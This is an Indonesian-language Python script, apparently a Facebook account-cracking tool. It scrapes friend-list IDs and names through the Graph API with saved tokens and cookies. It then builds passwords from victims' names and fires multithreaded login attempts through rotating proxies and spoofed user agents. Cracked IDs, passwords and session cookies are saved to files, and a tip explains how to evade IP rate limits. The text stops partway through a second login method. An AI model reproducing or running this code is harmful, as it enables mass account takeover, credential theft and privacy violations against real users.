	cetak(nel(f'\t    {B2}Masukan Domain! {M2}Example: {H2}@gmail.com{M2},{H2}@yahoo.com{M2}',style=f'bold blue',subtitle=f'┬ ────────────────────────────────────────────────────────────────────────'))
	doma = input(f'\x1b[1;94m╭──┤\n└─[{h}•{P}\x1b[1;94m] {P}Domain\33[m :{asu} ')
	if '@' not in str(doma) or '.com' not in str(doma):
		cetak(nel(f'{M2}         [!] Invalid Domain',width=39,style=f'bold red'))
		time.sleep(0.03);back()
	cetak(nel(f'\t\t {B2}Masukan Dump! {M2}Example: {H2}1000{M2},{H2}2000{M2},MAX {H2}5000{P2}',style=f'bold blue',subtitle=f'┬ ────────────────────────────────────────────────────────────────────────'))
	jumlah = input(f'\x1b[1;94m╭──┤\n└─[{h}•{P}\x1b[1;94m] {P}Dump\33[m :{asu} ')
	cetak(nel(f'\t\t{M2}Disarankan Untuk Menggunakan Method Vakidate!!!',style=f'bold red'))
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r   [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	setting()	

### SINGGLE ###
def dump_single():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		cetak(nel(f'{M2}         [!] cookie kadaluarsa!',width=39,style=f'bold red'))
		time.sleep(1)
		login()
	idnyanih = input(f'{B}   └─{P}[ {O}Masukan Id{P} ] : {H}')
	try:
		ambilid = requests.get('https://graph.facebook.com/v2.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenku[0],cookies={'cookie': cokies}).json()
		for proses in ambilid['friends']['data']:
			try:id.append(proses['id']+'|'+proses['name'])
			except:continue
		cetak(nel(f'{M2}         Id terkumpul : '+str(len(id)),width=39,style=f'bold red'))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		cetak(nel(f'{M2}         [e] Tidak ada jaringan!',width=39,style=f'bold red'))
		back()
	except (KeyError,IOError):
		cetak(nel(f'{M2}    [!] Pertemanan tidak public!',width=39,style=f'bold red'));time.sleep(1)
		back()

### CRACK-MASSAL ###
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{B}   └─{P}[ {O}Berapa Id?{P} ] : {H}'))
	except ValueError:
		cetak(nel(f'{M2}         [!] Cuma angka!',width=39,style=f'bold red'))
		dump_massal()
	if jum<1 or jum>10:
		cetak(nel(f'{M2}         [!] Max 10 Id!',width=39,style=f'bold red'))
		dump_massal()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{B}   └─{P}[ {O}Masukan Id Yang Ke{O} '+str(yz)+f'{P} ] :{asu} ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
				
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			cetak(nel(f'{M2}         [!] Jaringan Tidak Stabil!',width=39,style=f'bold red'))
			exit()
	try:
		print('')
		cetak(nel(f'{M2}         Id terkumpul : '+str(len(id)),width=39,style=f'bold red'))
		setting()
	except requests.exceptions.ConnectionError:
		cetak(nel(f'{M2}         [!] Jaringan Tidak Stabil!',width=39,style=f'bold red'))
		back()
	except (KeyError,IOError):
		cetak(nel(f'{M2}         [!] Pertemanan tidak publik!',width=39,style=f'bold red'))
		time.sleep(3)
		back()

### DUMP-FILE ###
def dumpid():
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cok.txt','r').read()
		os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:
		dum = int(input(f'{B}   └─{P}[ {O}Berapa Id?{P} ] : {H}'))
	except ValueError:
		cetak(nel(f'{M2}         [!] Cuma angka!',width=39,style=f'bold red'))
		dumpid()
	if dum<1 or dum>10:
		cetak(nel(f'{M2}         [!] Max 10 Id!',width=39,style=f'bold red'))
		dumpid()
	ses=requests.Session()
	dm = 0
	for met in range(dum):
		dm+=1
		kl = input(f'{B}   └─{P}[ {O}Masukan Id Yang Ke{O} '+str(dm)+f'{P} ] :{asu} ')
		uid.append(kl)
	for userr in uid:
		try:
#			batuampar = input(f"   {B}[{H}+{B}]{P} Nama File Dump  : {asu}")
			gajahmada  = ('ACHA-DUMP/ALDI-DUMP-'+ DUMP_F + '.txt').replace(' ', '_')
			xxx = open(gajahmada, 'w')
			coki = {"cookie":cookie}
			smpn20 = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(userr,token),cookies=coki).json()
			for sekupang in smpn20['friends']['data']:
				id.append(sekupang['id']+'|'+sekupang['name'])
				xxx.write(sekupang['id']+'|'+sekupang['name']+ '\n')
				print('\r   [+] Mengumpulkan %s Id'%(len(id)),end='')
				time.sleep(0.0050)
			print(f'\n')
			cetak(nel(f'\t    {P2}[{H2}•{P2}] Berhasil dump id publik{M2},{P2} file dump tersimpan di : \n\t      {P2}[{H2} {gajahmada}{P2} ]',style='bold blue'));time.sleep(3)
			input(f'{M}   ENTER UNTUK KEMBALI');back()
		except (KeyError,IOError):
			os.remove(gajahmada)
			cetak(nel(f'{M2}         [!] Pertemanan tidak publik!',width=39,style=f'bold red'))
			back()

### CRACK FILE ###
def crack_file():
	try:vin = os.listdir('ACHA-DUMP/')
	except FileNotFoundError:
		cetak(nel(f'{M2}         [!] File Tidak Di Temukan!',width=39,style=f'bold red'))
		time.sleep(2)
		exit()
	if len(vin)==0:
		cetak(nel(f'{M2}         [!] Tidak Ada File Dump!',width=39,style=f'bold red'))
		time.sleep(2)
		exit()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('ACHA-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{B}   ╰─[{H}%s{B}]{K} %s ({h} %s idz {P})'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(f'{B}   ╰─[{H}%s{B}]{K} %s ({h} %s idz {P})'%(nom,isi,len(hem)))
		geeh = input(f'{B}╭──┤\n└─[{h}•{P}{B}] {P}Pilih\33[m :{asu} ')
		try:geh = lol[geeh]
		except KeyError:
			cetak(nel(f'{M2}         [!] Invalid!',width=39,style=f'bold red'))
			time.sleep(2)
			back()
		try:lin = open('ACHA-DUMP/'+geh,'r').read().splitlines()
		except:
			cetak(nel(f'{M2}         [!] File tidak di temukan, coba lagi!',width=39,style=f'bold red'))
			time.sleep(1)
			exit()
		for xid in lin:
			id.append(xid)
		setting()

### CHECK RESULT CRACK ###
def result():
	os.system('clear')
	banner()
	cetak(nel(f'{H2}• [01] RESULT OK{P2}\n{K2}• [02] RESULT CP{P2}\n{M2}• [03] KEMBALI',style=f'bold blue',subtitle=f'┬ ────────────────────────────────────────────────────────────────────────'))
	kz = input(f'{B}╭──┤\n└─[{h}•{P}{B}] {P}Pilih\33[m :{asu} ')
	if kz in ['02','2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			cetak(nel(f'{M2}         [!] File Tidak Di Temukan!',width=39,style=f'bold red'))
			time.sleep(3)
			result()
		if len(vin)==0:
			cetak(nel(f'{M2}         [!] Tidak Memilik File Cp!',width=39,style=f'bold red'))
			time.sleep(2)
			result()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{K}   ─▻ [%s] %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'{B}   └─{P}[ {O}Pilih{P} ] : {H}')
			try:geh = lol[geeh]
			except KeyError:
				time.sleep(2)
				cetak(nel(f'{M2}         [!] Menu Invalid!',width=39,style=f'bold red'))
				result()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				cetak(nel(f'{M2}         [!] File tidak di temukan!',width=39,style=f'bold red'))
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cetak(nel(f'{B2}ALDI-CP {K2}{cpkuni[0]}|{cpkuni[1]}',style='bold blue',width=39))
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			result()
	elif kz in ['01','1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			cetak(nel(f'{M2}         [!] File tidak di temukan!',width=39,style=f'bold red'))
			time.sleep(2)
			result()
		if len(vin)==0:
			cetak(nel(f'{M2}         [!] File ok tidak di temukan!',width=39,style=f'bold red'))
			time.sleep(2)
			result()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{H}─▻ [%s] %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{H}─▻ [%s] %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				time.sleep(2)
				cetak(nel(f'{M2}         [!] Menu invalid!',width=39,style=f'bold red'))
				result()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				cetak(nel(f'{M2}         [!] File tidak ditemukan!',width=39,style=f'bold red'))
				time.sleep(2)
				result()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cetak(nel(f'{B2}ALDI-CP {K2}{cpkuni[0]}|{cpkuni[1]}',style='bold blue',width=39))
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			result()
	elif kz in ['kembali','Kembali','KEMBALI','03','3']:
		back()
	else:
		cetak(nel(f'{M2}         [!] Menu invalid!',width=39,style=f'bold red'))
		time.sleep(3)
		result()
		
### NO HP CHECKER ###
import sys
import requests
import json
import time
def nomphp():
	banner()
	number = input('\33[m[\033[93m?\33[m] MASUKKAN NOMER TELEPON COK > \x1b[1;92m')
	output = requests.get(f'http://phone-number-api.com/json/?number={number}').text
	obj = json.loads(output)
		
	query = obj['query']
	status = obj['status']
	numberType = obj['numberType']
	numberCountryCode = obj['numberCountryCode']
	numberAreaCode = obj['numberAreaCode']
	ext = obj['ext']
	dialFromCountryCode = obj['dialFromCountryCode']
	carrier = obj['carrier']
	continent = obj['continent']
	continentCode = obj['continentCode']
	country = obj['country']
	countryName = obj['countryName']
	lat = obj['lat']
	lon = obj['lon']
	timezone = obj['timezone']
	offset = obj['offset']
	currency = obj['currency']
	jalan('[+] Information Output')
	jalan('--------------------------------------')
	jalan(f' - Phone number: {query}')
	jalan(f' - Status: {status}')
	jalan(f' - Number type: {numberType}')
	jalan(f' - Number Country Code: {numberCountryCode}')
	jalan(f' - Number Area Code: {numberAreaCode}')
	jalan(f' - ext: {ext}')
	jalan(f' - dial country: {dialFromCountryCode}')
	jalan(f' - carrier: {carrier}')
	jalan(f' - continent: {continent}')
	jalan(f' - continent code: {continentCode}')
	jalan(f' - country: {country}')
	jalan(f' - countryname: {countryName}')
	jalan(f' - Latitude: {lat}')
	jalan(f' - Longitude: {lon}')
	jalan(f' - timezone: {timezone}')
	jalan(f' - offset: {offset}')
	jalan(f' - currency: {currency}');time.sleep(2)
	jalan(f'{M}Code by Lexxrt\33[m');time.sleep(2)
	input(f'\n{M}Tekan Enter Untuk Kembali')
	back()

### SETTING ###
def setting():
	print(f'')
	cetak(nel(f'\t\t      {B2}• {P2}[{B2}01{P2}] {H2}Crack{P2} Akun Dari Id Old{B2} •{P2}\n\t\t      {B2}• {P2}[{B2}02{P2}] {H2}Crack{P2} Akun Dari Id New{B2} •\n\t\t\t {B2}• {P2}[{B2}03{P2}] {H2}Crack{P2} Akun Random{B2} •{P2}{P2}',title=f'{P2}[ {B2}URUTAN ID {P2}]',style="bold blue",subtitle=f'┬ ────────────────────────────────────────────────────────────────────────'))
	hu = input(f'{B}╭──┤\n└─[{h}•{P}{B}] {P}Pilih\33[m :{asu} ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		cetak(nel(f'{M2}         [!] invalid menu!',width=39,style=f'bold red'))
		exit()
	cetak(nel(f'\t\t        {B2}• {P2}[{B2}01{P2}] {H2}Method{P2} Validate\n\t\t        {B2}• {P2}[{B2}02{P2}] {H2}Method{P2} Regular\n\t\t        {B2}• {P2}[{B2}03{P2}] {H2}Method{P2} Async',title=f'{P2}[ {B2}METHOD {P2}]',style="bold blue",subtitle=f'┬ ────────────────────────────────────────────────────────────────────────'))
	hc = input(f'{B}╭──┤\n└─[{h}•{P}{B}] {P}Pilih\33[m :{asu} ')
	if hc in ['1','01']:
		method.append('validate')
	elif hc in ['2','02']:
		method.append('alpha')
	elif hc in ['3','03']:
		method.append('async')
	elif hc in ['']:
		cetak(nel(f'{M2}         [!] invalid menu!',width=39,style=f'bold red'))
		setting()
	else:
		method.append('validate')
	cetak(nel(f'\t      Jika memasukan kata sandi, minimal 6 huruf/angka\n\t\t    Example: Sayang123,KorbanPhp,123456',title=f'{P2}[ {B2}KATA SANDI {P2}]',style="bold blue",subtitle=f'┬ ────────────────────────────────────────────────────────────────────────'))
	pwplus = input(f'{B}╭──┤\n└─[{h}•{P}{B}] {P}Mau Menambahkan {H}Kata Sandi\33[m? Y/T\33[m :{asu} ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'{B}   └─[{h}•{P}{B}] {P}Pilih\33[m :{asu} ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	
### PASSWORD WORDLIST ###
def passwrd():
	os.system('clear')
	banner()
	cetak(nel(f'{M2}╒─▻ {P2}Hasil {H2}OK{P2} Akan Tersimpan Di : {H2}OK/%s {P2}'%(okc)+f'\n{M2}╠─▻ {P2}Hasil {K2}CP{P2} Akan Tersimpan Di : {K2}CP/%s {P2}'%(cpc)+f'\n{M2}╘─▻ {P2}Mainkan Mode Pesawat Setiap {M2}200{P2} Id Agar Tidak Terkena Spam Ip',style=f'bold blue'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['12345']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'12345678')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'12345678')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'validate' in method:
				pool.submit(method_validate,idf,pwv)
			elif 'alpha' in method:
				pool.submit(method_alpha,idf,pwv)
			elif 'async' in method:
				pool.submit(method_Async,idf,pwv)
			else:
				pool.submit(method_validate,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
		exit()

lod=random.choice(["█■■■■","■█■■■","■■█■■","■■■█■","■■■■█"])
def method_validate(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write(f"\r{P}[{bo}ACHA-CNZ{P}] {h}{P}{b}{loop}{P}/{P}{len(id)}{P} {hh}OK:{P}{ok}{P} {kk}CP:{P}{cp}{P} {bo}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+random.choice(nip)}
			headers = {
'host': 'mbasic.facebook.com',
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'cache-control': 'max-age=0',
'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'sec-ch-ua-platform-version': '"9.0.0"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'none',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent': ua,
			# headers = {
				# 'Host': 'm.facebook.com',
				# 'content-length': '1028',
				# 'cache-control': 'max-age=0',
				# 'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
				# 'sec-ch-ua-mobile': '?1',
				# 'sec-ch-ua-platform': '"Android"',
				# 'origin': 'https://m.facebook.com',
				# 'dnt': '1',
				# 'upgrade-insecure-requests': '1',
				# 'content-type': 'application/x-www-form-urlencoded',
				# 'user-agent': ua,
				# 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				# 'sec-fetch-site': 'same-origin',
				# 'sec-fetch-mode': 'navigate',
				# 'sec-fetch-user': '?1',
				# 'sec-fetch-dest': 'document',
'referer': f'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://m.facebook.com/login.php?skip_api_login=1&api_key=124578887583575&kid_directed_site=0&app_id=124578887583575&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D124578887583575%26cbt%3D1688753076270%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17f3ba114bc874%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3c0245ac63ee1c%2526relation%253Dopener%26client_id%3D124578887583575%26display%3Dtouch%26domain%3Dwww.mediafire.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.mediafire.com%252Flogin%252F%26locale%3Den_US%26logger_id%3Df3e0661d719b664%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df16dd3141e4ad38%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3c0245ac63ee1c%2526relation%253Dopener%2526frame%253Df1da3ad30ff0e48%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df16dd3141e4ad38%26domain%3Dwww.mediafire.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.mediafire.com%252Ff3c0245ac63ee1c%26relation%3Dopener%26frame%3Df1da3ad30ff0e48%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
}
			urls = sop(ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://m.facebook.com/login.php?skip_api_login=1&api_key=124578887583575&kid_directed_site=0&app_id=124578887583575&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D124578887583575%26cbt%3D1688753076270%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17f3ba114bc874%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3c0245ac63ee1c%2526relation%253Dopener%26client_id%3D124578887583575%26display%3Dtouch%26domain%3Dwww.mediafire.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.mediafire.com%252Flogin%252F%26locale%3Den_US%26logger_id%3Df3e0661d719b664%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df16dd3141e4ad38%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3c0245ac63ee1c%2526relation%253Dopener%2526frame%253Df1da3ad30ff0e48%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df16dd3141e4ad38%26domain%3Dwww.mediafire.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.mediafire.com%252Ff3c0245ac63ee1c%26relation%3Dopener%26frame%3Df1da3ad30ff0e48%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text, "html.parser")
			form = urls.find('form', {'method':'post'})
			data = {
				'lsd': re.search('name="lsd" type="hidden" value="(.*?)"',str(form)).group(1),
				'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
				'uid': idf,
				'next': 'https://mbasic.facebook.com/v2.9/dialog/oauth/?platform=facebook&client_id=1862952583919182&response_type=token&redirect_uri=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F&state=%7B%22client_id%22%3A%221862952583919182%22%2C%22network%22%3A%22facebook%22%2C%22display%22%3A%22popup%22%2C%22callback%22%3A%22_hellojs_2o6bz3k9%22%2C%22state%22%3A%22%22%2C%22redirect_uri%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%22%2C%22scope%22%3A%22basic%22%7D&scope=public_profile&auth_type=reauthenticate&display=popup&ret=login&fbapp_pres=0&logger_id=0174e559-53c1-478b-ad4f-c6e7b3c861bc&tp=unspecified',
				'flow': 'login_no_pin',
				'pass': pw,
			}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				os.popen('play-audio data/cp')
				print(f'\r{O}□┈┈➤{K} {idf}|{pw}{O} {U}<//> {O}{tahun(idf)}\n└➤{K} {ua}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')			
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				os.popen('play-audio data/ok')
				print(f'\r{O}□┈┈➤{H} {idf}|{pw}{O} {U}<//> {O}{tahun(idf)}\n└➤{H} {kuki}\n□┈┈➤ {H}{ua}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
### METHOD ALPHA ###
def method_alpha(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write(f"\r{P}[{bo}ACHA-CNZ{P}] {h}{P}{b}{loop}{P}/{P}{len(id)}{P} {hh}OK:{P}{ok}{P} {kk}CP:{P}{cp}{P} {bo}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124578887583575&kid_directed_site=0&app_id=124578887583575&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D124578887583575%26cbt%3D1688753076270%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17f3ba114bc874%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3c0245ac63ee1c%2526relation%253Dopener%26client_id%3D124578887583575%26display%3Dtouch%26domain%3Dwww.mediafire.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.mediafire.com%252Flogin%252F%26locale%3Den_US%26logger_id%3Df3e0661d719b664%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df16dd3141e4ad38%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3c0245ac63ee1c%2526relation%253Dopener%2526frame%253Df1da3ad30ff0e48%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df16dd3141e4ad38%26domain%3Dwww.mediafire.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.mediafire.com%252Ff3c0245ac63ee1c%26relation%3Dopener%26frame%3Df1da3ad30ff0e48%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
